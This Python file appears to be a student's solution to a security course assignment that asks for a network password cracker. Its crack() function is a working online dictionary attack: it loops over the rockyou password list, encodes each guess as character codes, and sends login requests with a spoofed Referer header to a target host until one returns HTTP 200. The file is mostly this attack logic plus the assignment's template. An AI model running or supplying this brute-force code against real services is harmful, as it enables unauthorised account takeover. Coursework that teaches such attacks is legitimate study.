# network_cracker.py
#
# NOTE: Python 3 is used by default.
# You may use Python 2 by changing python3 to python2 in network_cracker.sh,
# as well as removing the parentheses from the main() function's print
# statements.
#
# If not using Python, see network_cracker.sh for instructions.
# (but please use Python, it is probably the easiest)
#
# ==== DEPENDENCIES ====
#
# The grading machine is guaranteed to have Python 2.7+, Python 3.4+, and the
# Python "requests" library. Please specify any other dependencies by adding
# their installation commands to setup.sh.
#
# TODO: briefly describe how this cracker works.

import sys
import requests
import random


def custom_url_string(original):
    res = ""
    for c in original:
        lol = ord(c)
        res += "{}-".format(lol)
    return res[:-1]

# If succesful, returns the cracked password.
# If unsuccessful, returns None.
def crack(username, hostname, port):
    un = custom_url_string(username)
    f = open('data/rockyoupasswords.txt', 'r')
    for pw in f.readlines():
        pw = pw.strip('\n')
        oldpw = pw
        pw = custom_url_string(pw)
        url = "http://{}:{}/$0000000000?pw={}&un={}.inbox".format(hostname, port, pw, un)        
        headers = {"Referer": "http://{}:{}/".format(hostname, port)}
        r = requests.get(url, headers=headers)
        if (r.status_code == 200):
            return oldpw
            break


# Do NOT change anything below (unless you are using Python 2, in which case
# only fix the print statement syntax).

def main():
    if len(sys.argv) != 4:
        print('Usage:', sys.argv[0], '<username>', '<hostname>', '<port>')
        sys.exit(1)

    username = sys.argv[1]
    hostname = sys.argv[2]
    port = int(sys.argv[3])
    cracked = crack(username, hostname, port)

    if not cracked:
        print('Cracking unsuccessful :(')
        sys.exit(1)

    print('Success! The cracked password is:')
    print(cracked)


if __name__ == '__main__':
    main()
